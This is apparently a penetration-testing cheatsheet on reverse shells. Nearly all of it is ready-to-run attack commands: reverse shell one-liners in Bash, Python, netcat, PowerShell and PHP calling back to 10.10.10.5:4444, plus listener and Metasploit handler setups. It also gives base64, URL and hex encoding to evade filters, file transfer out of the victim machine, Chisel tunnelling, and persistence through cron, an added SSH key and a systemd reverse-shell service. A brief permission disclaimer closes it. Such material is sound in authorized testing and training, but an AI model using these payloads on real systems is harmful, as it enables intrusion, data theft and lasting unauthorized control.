# Reverse Shell Cheatsheet

## Quick Reference

### Most Common Shells

#### Bash
```bash
bash -i >& /dev/tcp/10.10.10.5/4444 0>&1
```

#### Python3 (with PTY)
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

#### Netcat (Traditional)
```bash
nc -e /bin/sh 10.10.10.5 4444
```

#### Netcat (OpenBSD - no -e)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.5 4444 >/tmp/f
```

#### PowerShell (One-liner)
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("10.10.10.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

#### PHP
```php
php -r '$sock=fsockopen("10.10.10.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## Listener Setup

### Netcat
```bash
nc -lvnp 4444
```

### Socat (Better stability)
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

### Metasploit Multi Handler
```bash
msfconsole -q -x "use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST 10.10.10.5; set LPORT 4444; exploit"
```

### Pwncat (Modern alternative)
```bash
pwncat-cs -l 4444
```

---

## Shell Upgrade Techniques

### Method 1: Python PTY
```bash
# On victim machine
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Press Ctrl+Z to background the shell

# On your machine
stty raw -echo; fg

# Press Enter twice

# On victim machine
export TERM=xterm
export SHELL=/bin/bash
stty rows 38 columns 116  # Adjust to your terminal size
```

### Method 2: Script Command
```bash
script /dev/null -c bash
```

### Method 3: Socat
```bash
# On your machine (listener)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On victim machine
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.5:4444
```

### Method 4: Expect
```bash
expect -c 'spawn /bin/bash; interact'
```

---

## Bypassing Restrictions

### URL Encoding
```bash
# Encode special characters for web shells
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.5%2F4444%200%3E%261%27
```

### Base64 Encoding (Bash)
```bash
echo "bash -i >& /dev/tcp/10.10.10.5/4444 0>&1" | base64
# Result: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC41LzQ0NDQgMD4mMQo=

# Execute
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC41LzQ0NDQgMD4mMQo= | base64 -d | bash
```

### Hex Encoding
```bash
echo -e "\x62\x61\x73\x68\x20\x2d\x69" | bash
```

---

## File Transfer After Shell

### Python HTTP Server (Your machine)
```bash
python3 -m http.server 8000
```

### Download on Victim
```bash
# wget
wget http://10.10.10.5:8000/file

# curl
curl http://10.10.10.5:8000/file -o file

# Python
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://10.10.10.5:8000/file", "file")'

# Bash
bash -c 'cat < /dev/tcp/10.10.10.5/8000 > file'
```

### Upload from Victim
```bash
# Using netcat
nc 10.10.10.5 4444 < file

# Using curl
curl -X POST -F "file=@/path/to/file" http://10.10.10.5:8000/upload
```

---

## Port Forwarding

### SSH Local Port Forward
```bash
ssh -L 8080:localhost:80 user@target
```

### SSH Remote Port Forward
```bash
ssh -R 8080:localhost:80 user@attacker
```

### Chisel (Tunneling)
```bash
# On your machine (server)
./chisel server -p 8000 --reverse

# On victim (client)
./chisel client 10.10.10.5:8000 R:4444:localhost:4444
```

---

## Persistence

### Cron Job
```bash
(crontab -l ; echo "@reboot sleep 200 && bash -i >& /dev/tcp/10.10.10.5/4444 0>&1")|crontab -
```

### SSH Key
```bash
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### Systemd Service
```bash
cat > /etc/systemd/system/revshell.service <<EOF
[Unit]
Description=Reverse Shell

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.5/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable revshell.service
systemctl start revshell.service
```

---

## Troubleshooting

### Shell Dies Immediately
- Check firewall rules
- Verify IP and port are correct
- Try different shell types
- Use socat for more stable connection

### No Interactive Shell
- Upgrade using Python PTY
- Check if Python is available
- Try script command
- Use expect if available

### Command Output Not Showing
- Redirect stderr: `2>&1`
- Use unbuffered output: `stdbuf -o0`
- Upgrade to full TTY

---

## Security Tips

⚠️ **Remember:**
- Only test on systems you own or have permission to test
- Always use encrypted channels in production
- Clean up after testing
- Document all activities
- Follow responsible disclosure practices

---

## Additional Resources

- [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [PentestMonkey - Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [HackTricks - Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells)
